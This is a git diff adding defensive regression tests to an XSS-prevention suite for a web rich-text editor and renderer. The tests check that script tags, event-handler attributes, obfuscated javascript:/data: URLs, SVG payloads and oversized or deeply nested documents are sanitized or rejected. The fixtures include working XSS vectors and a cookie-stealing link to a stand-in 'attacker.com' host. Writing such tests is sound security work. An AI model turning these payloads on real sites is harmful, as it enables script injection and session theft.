@@ -4,6 +4,10 @@ import { RichTextContextComponent } from './rich-text-context';
 import { RichTextRendererComponent } from './rich-text-renderer';
 import type { RichTextFeatureLinkComponent } from './features/rte-link';
 
+import './rich-text-context';
+import './rich-text-renderer';
+import './features/rte-link';
+
 describe('Security: XSS Prevention', () => {
   describe('Security Hardening - Insecure Properties Removed', () => {
     it('should not expose validateUrls property on rte-link', async () => {
@@ -689,6 +693,627 @@ describe('Security: XSS Prevention', () => {
 
       const output = el.toHTML();
       expect(output).to.not.include('data-evil');
+    });
+  });
+
+  describe('Regression Tests - Ensure Security Measures Remain in Place', () => {
+    describe('HTML Sanitization in toHTML()', () => {
+      it('should always escape HTML entities in text content (prevent XSS)', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        // Test various XSS vectors
+        const xssVectors = [
+          '<script>alert(1)</script>',
+          '<img src=x onerror=alert(1)>',
+          '<svg onload=alert(1)>',
+          '<iframe src="javascript:alert(1)"></iframe>',
+          '<object data="javascript:alert(1)"></object>',
+          '<embed src="javascript:alert(1)">',
+          '<link rel=stylesheet href="javascript:alert(1)">',
+          '<style>@import"javascript:alert(1)";</style>',
+          '<form action="javascript:alert(1)"><button>Click</button></form>',
+          '<input type=text onfocus=alert(1) autofocus>',
+          '<video><source onerror=alert(1)></video>',
+          '<audio src=x onerror=alert(1)>'
+        ];
+
+        for (const vector of xssVectors) {
+          el.content = `<p>${vector}</p>`;
+          await el.updateComplete;
+          const output = el.toHTML();
+
+          // Verify HTML entities are escaped
+          expect(output).to.not.include('<script');
+          expect(output).to.not.include('<img');
+          expect(output).to.not.include('<svg');
+          expect(output).to.not.include('<iframe');
+          expect(output).to.not.include('<object');
+          expect(output).to.not.include('<embed');
+          expect(output).to.not.include('onerror=');
+          expect(output).to.not.include('onload=');
+        }
+      });
+
+      it('should escape angle brackets in all contexts', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        el.content = '<p>Test <test> value</p>';
+        await el.updateComplete;
+
+        const output = el.toHTML();
+        expect(output).to.include('&lt;test&gt;');
+        expect(output).to.not.match(/<test>/);
+      });
+
+      it('should escape quotes and apostrophes', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        el.content = '<p>Test "quotes" and \'apostrophes\'</p>';
+        await el.updateComplete;
+
+        const output = el.toHTML();
+        // HTML entities should be escaped (quotes may be escaped or preserved)
+        expect(output).to.match(/&quot;|"/);
+        expect(output).to.match(/&#039;|'/);
+      });
+
+      it('should handle nested HTML entities correctly', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        el.content = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>';
+        await el.updateComplete;
+
+        const output = el.toHTML();
+        // Should remain escaped, not double-escaped or unescaped
+        expect(output).to.include('&lt;script&gt;');
+        expect(output).to.not.include('<script>');
+      });
+    });
+
+    describe('Protocol Validation - Always Block Dangerous Protocols', () => {
+      it('should never allow javascript: protocol in any form', async () => {
+        const el = await fixture<RichTextContextComponent>(html`
+          <forge-rich-text-context>
+            <forge-rte-link></forge-rte-link>
+          </forge-rich-text-context>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const dangerousVariants = [
+          'javascript:alert(1)',
+          'JavaScript:alert(1)',
+          'JAVASCRIPT:alert(1)',
+          'java\nscript:alert(1)',
+          'java\rscript:alert(1)',
+          'java\tscript:alert(1)',
+          ' javascript:alert(1)',
+          'javascript :alert(1)',
+          'java%0ascript:alert(1)',
+          'java%0dscript:alert(1)',
+          'java%09script:alert(1)',
+          'jav&#x61;script:alert(1)',
+          '&#106;avascript:alert(1)'
+        ];
+
+        for (const variant of dangerousVariants) {
+          (el as any).content = {
+            type: 'doc',
+            content: [
+              {
+                type: 'paragraph',
+                content: [
+                  {
+                    type: 'text',
+                    text: 'Link',
+                    marks: [{ type: 'link', attrs: { href: variant } }]
+                  }
+                ]
+              }
+            ]
+          };
+          await el.updateComplete;
+
+          const output = el.toHTML();
+          // Should be sanitized to # or blocked
+          expect(output.toLowerCase()).to.not.include('javascript:');
+        }
+      });
+
+      it('should never allow data: URLs', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const dataUrls = [
+          'data:text/html,<script>alert(1)</script>',
+          'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+          'DATA:text/html,<script>alert(1)</script>',
+          'data:text/javascript,alert(1)',
+          'data:image/svg+xml,<svg onload=alert(1)>'
+        ];
+
+        for (const url of dataUrls) {
+          (el as any).content = {
+            type: 'doc',
+            content: [
+              {
+                type: 'paragraph',
+                content: [
+                  {
+                    type: 'text',
+                    text: 'Link',
+                    marks: [{ type: 'link', attrs: { href: url } }]
+                  }
+                ]
+              }
+            ]
+          };
+          await el.updateComplete;
+
+          const output = el.toHTML();
+          expect(output.toLowerCase()).to.not.include('data:');
+        }
+      });
+
+      it('should never allow file:, vbscript:, about:, or blob: protocols', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const dangerousProtocols = [
+          'file:///etc/passwd',
+          'vbscript:msgbox(1)',
+          'about:blank',
+          'blob:https://example.com/uuid'
+        ];
+
+        for (const protocol of dangerousProtocols) {
+          (el as any).content = {
+            type: 'doc',
+            content: [
+              {
+                type: 'paragraph',
+                content: [
+                  {
+                    type: 'text',
+                    text: 'Link',
+                    marks: [{ type: 'link', attrs: { href: protocol } }]
+                  }
+                ]
+              }
+            ]
+          };
+          await el.updateComplete;
+
+          const output = el.toHTML();
+          const protocolName = protocol.split(':')[0].toLowerCase();
+          expect(output.toLowerCase()).to.not.include(`${protocolName}:`);
+        }
+      });
+    });
+
+    describe('JSON Sanitization - Always Validate Input', () => {
+      it('should always sanitize JSON input regardless of source', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const maliciousJson = {
+          type: 'doc',
+          content: [
+            {
+              type: 'paragraph',
+              content: [
+                {
+                  type: 'text',
+                  text: 'Click here',
+                  marks: [
+                    {
+                      type: 'link',
+                      attrs: {
+                        href: 'javascript:document.location="http://attacker.com?cookie="+document.cookie'
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        };
+
+        (el as any).content = maliciousJson;
+        await el.updateComplete;
+
+        const output = el.toHTML();
+        expect(output.toLowerCase()).to.not.include('javascript:');
+      });
+
+      it('should enforce maximum depth limit to prevent DoS', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        // Create deeply nested structure
+        let deepContent: any = { type: 'text', text: 'Deep' };
+        for (let i = 0; i < 60; i++) {
+          deepContent = {
+            type: 'paragraph',
+            content: [deepContent]
+          };
+        }
+
+        const malicious = {
+          type: 'doc',
+          content: [deepContent]
+        };
+
+        try {
+          (el as any).content = malicious;
+          await el.updateComplete;
+          // Should either throw or handle gracefully
+        } catch (error) {
+          expect((error as Error).message).to.include('depth');
+        }
+
+        // Editor should remain functional
+        expect(el.isInitialized).to.be.true;
+      });
+
+      it('should enforce maximum node count to prevent DoS', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        // Create massive structure
+        const hugeContent = {
+          type: 'doc',
+          content: Array(6000)
+            .fill(null)
+            .map(() => ({
+              type: 'paragraph',
+              content: [{ type: 'text', text: 'x' }]
+            }))
+        };
+
+        try {
+          (el as any).content = hugeContent;
+          await el.updateComplete;
+        } catch (error) {
+          expect((error as Error).message).to.include('node count');
+        }
+
+        // Editor should remain functional
+        expect(el.isInitialized).to.be.true;
+      });
+
+      it('should sanitize URL-encoded protocols in JSON', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const encodedAttacks = [
+          'java%73cript:alert(1)',
+          '%6A%61%76%61%73%63%72%69%70%74:alert(1)',
+          'data%3Atext/html,<script>alert(1)</script>'
+        ];
+
+        for (const encoded of encodedAttacks) {
+          (el as any).content = {
+            type: 'doc',
+            content: [
+              {
+                type: 'paragraph',
+                content: [
+                  {
+                    type: 'text',
+                    text: 'Link',
+                    marks: [{ type: 'link', attrs: { href: encoded } }]
+                  }
+                ]
+              }
+            ]
+          };
+          await el.updateComplete;
+
+          const output = el.toHTML();
+          expect(output.toLowerCase()).to.not.include('javascript');
+          expect(output.toLowerCase()).to.not.include('data:');
+        }
+      });
+    });
+
+    describe('Renderer Security - Must Sanitize Untrusted Content', () => {
+      it('should always sanitize content in renderer (same as editor)', async () => {
+        const renderer = await fixture<RichTextRendererComponent>(html`
+          <forge-rich-text-renderer></forge-rich-text-renderer>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const malicious = {
+          type: 'doc',
+          content: [
+            {
+              type: 'paragraph',
+              content: [
+                {
+                  type: 'text',
+                  text: 'Malicious link',
+                  marks: [{ type: 'link', attrs: { href: 'javascript:steal_data()' } }]
+                }
+              ]
+            }
+          ]
+        };
+
+        (renderer as any).content = malicious;
+        await renderer.updateComplete;
+
+        const renderedLinks = renderer.shadowRoot?.querySelectorAll('a');
+        renderedLinks?.forEach(link => {
+          const href = link.getAttribute('href') || '';
+          expect(href.toLowerCase()).to.not.include('javascript:');
+        });
+      });
+
+      it('should enforce same depth limits in renderer', async () => {
+        const renderer = await fixture<RichTextRendererComponent>(html`
+          <forge-rich-text-renderer></forge-rich-text-renderer>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        let deepContent: any = { type: 'text', text: 'Deep' };
+        for (let i = 0; i < 60; i++) {
+          deepContent = { type: 'paragraph', content: [deepContent] };
+        }
+
+        try {
+          (renderer as any).content = { type: 'doc', content: [deepContent] };
+          await renderer.updateComplete;
+        } catch (error) {
+          expect((error as Error).message).to.include('depth');
+        }
+      });
+
+      it('should enforce same node count limits in renderer', async () => {
+        const renderer = await fixture<RichTextRendererComponent>(html`
+          <forge-rich-text-renderer></forge-rich-text-renderer>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const hugeContent = {
+          type: 'doc',
+          content: Array(6000)
+            .fill(null)
+            .map(() => ({ type: 'paragraph', content: [{ type: 'text', text: 'x' }] }))
+        };
+
+        try {
+          (renderer as any).content = hugeContent;
+          await renderer.updateComplete;
+        } catch (error) {
+          expect((error as Error).message).to.include('node count');
+        }
+      });
+    });
+
+    describe('Paste Handler Security - Must Remove Dangerous Elements', () => {
+      it('should always remove SVG elements (security hardening)', async () => {
+        const el = await fixture<RichTextContextComponent>(html`
+          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const svgAttacks = [
+          '<svg onload=alert(1)></svg>',
+          '<svg><script>alert(1)</script></svg>',
+          '<svg><animate onbegin=alert(1)></animate></svg>',
+          '<svg><set onbegin=alert(1)></set></svg>',
+          '<math><maction actiontype=statusline#http://google.com>CLICKME</maction></math>'
+        ];
+
+        for (const svg of svgAttacks) {
+          el.content = `<p>${svg}</p>`;
+          await el.updateComplete;
+          const output = el.toHTML();
+          expect(output.toLowerCase()).to.not.include('<svg');
+          expect(output.toLowerCase()).to.not.include('<math');
+          expect(output.toLowerCase()).to.not.include('onload');
+        }
+      });
+
+      it('should always remove audio and video elements', async () => {
+        const el = await fixture<RichTextContextComponent>(html`
+          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const mediaAttacks = [
+          '<audio src=x onerror=alert(1)></audio>',
+          '<video><source onerror=alert(1)></video>',
+          '<audio controls><source src="javascript:alert(1)"></audio>'
+        ];
+
+        for (const media of mediaAttacks) {
+          el.content = `<p>${media}</p>`;
+          await el.updateComplete;
+          const output = el.toHTML();
+          expect(output.toLowerCase()).to.not.include('<audio');
+          expect(output.toLowerCase()).to.not.include('<video');
+          expect(output.toLowerCase()).to.not.include('onerror');
+        }
+      });
+
+      it('should always remove all event handler attributes', async () => {
+        const el = await fixture<RichTextContextComponent>(html`
+          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const eventHandlers = [
+          'onclick',
+          'onload',
+          'onerror',
+          'onmouseover',
+          'onfocus',
+          'onblur',
+          'onchange',
+          'onsubmit',
+          'onkeydown',
+          'onkeyup',
+          'onmouseenter',
+          'onmouseleave'
+        ];
+
+        for (const handler of eventHandlers) {
+          el.content = `<p><span ${handler}="alert(1)">Text</span></p>`;
+          await el.updateComplete;
+          const output = el.toHTML();
+          expect(output.toLowerCase()).to.not.include(handler);
+        }
+      });
+
+      it('should always remove inline style attributes', async () => {
+        const el = await fixture<RichTextContextComponent>(html`
+          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        el.content = '<p style="background:url(javascript:alert(1))">Text</p>';
+        await el.updateComplete;
+
+        const output = el.toHTML();
+        expect(output.toLowerCase()).to.not.include('style=');
+      });
+
+      it('should always remove data-* attributes', async () => {
+        const el = await fixture<RichTextContextComponent>(html`
+          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        el.content = '<p data-payload="malicious" data-track="user">Text</p>';
+        await el.updateComplete;
+
+        const output = el.toHTML();
+        expect(output).to.not.include('data-payload');
+        expect(output).to.not.include('data-track');
+      });
+    });
+
+    describe('Security Warnings - Must Always Log', () => {
+      it('should log warnings when blocking dangerous protocols', async () => {
+        const warnSpy = sinon.spy(console, 'warn');
+
+        try {
+          const el = await fixture<RichTextContextComponent>(html`
+            <forge-rich-text-context></forge-rich-text-context>
+          `);
+          await new Promise(resolve => setTimeout(resolve, 100));
+
+          (el as any).content = {
+            type: 'doc',
+            content: [
+              {
+                type: 'paragraph',
+                content: [
+                  {
+                    type: 'text',
+                    text: 'Link',
+                    marks: [{ type: 'link', attrs: { href: 'javascript:alert(1)' } }]
+                  }
+                ]
+              }
+            ]
+          };
+          await el.updateComplete;
+
+          // Should have logged a security warning
+          expect(warnSpy.calledWith(sinon.match(/Blocked dangerous protocol/))).to.be.true;
+        } finally {
+          warnSpy.restore();
+        }
+      });
+
+      it('should log errors when content sanitization fails', async () => {
+        const errorSpy = sinon.spy(console, 'error');
+
+        try {
+          const el = await fixture<RichTextContextComponent>(html`
+            <forge-rich-text-context></forge-rich-text-context>
+          `);
+          await new Promise(resolve => setTimeout(resolve, 100));
+
+          // Create circular reference (will cause sanitization to fail)
+          const circular: any = { type: 'doc', content: [] };
+          circular.content.push(circular);
+
+          try {
+            el.content = circular;
+            await el.updateComplete;
+          } catch {
+            // Expected to fail
+          }
+
+          // Should have logged an error
+          expect(errorSpy.called).to.be.true;
+        } finally {
+          errorSpy.restore();
+        }
+      });
+    });
+
+    describe('No Bypass Mechanisms - Security Cannot Be Disabled', () => {
+      it('should have no way to disable HTML entity escaping', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        // Verify no public properties or methods that could disable sanitization
+        expect((el as any).disableSanitization).to.be.undefined;
+        expect((el as any).unsafeHTML).to.be.undefined;
+        expect((el as any).skipValidation).to.be.undefined;
+        expect((el as any).allowUnsafeProtocols).to.be.undefined;
+      });
+
+      it('should have no way to disable protocol validation', async () => {
+        const el = await fixture<RichTextContextComponent>(html`
+          <forge-rich-text-context>
+            <forge-rte-link></forge-rte-link>
+          </forge-rich-text-context>
+        `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
+
+        // Verify properties that could disable security don't exist
+        expect(link).to.not.have.property('validateUrls');
+        expect(link).to.not.have.property('allowDangerousProtocols');
+        expect(link).to.not.have.property('skipValidation');
+      });
+
+      it('should have no way to suppress security warnings', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        expect(el).to.not.have.property('suppressErrors');
+        expect(el).to.not.have.property('suppressWarnings');
+        expect(el).to.not.have.property('silentMode');
+      });
+
+      it('should have no way to disable JSON sanitization', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        expect((el as any).skipJSONValidation).to.be.undefined;
+        expect((el as any).trustContent).to.be.undefined;
+        expect((el as any).unsafeMode).to.be.undefined;
+      });
+
+      it('should have no way to bypass depth or node limits', async () => {
+        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
+        await new Promise(resolve => setTimeout(resolve, 100));
+
+        expect((el as any).maxDepth).to.be.undefined;
+        expect((el as any).maxNodes).to.be.undefined;
+        expect((el as any).unlimitedNesting).to.be.undefined;
+      });
     });
   });
 });
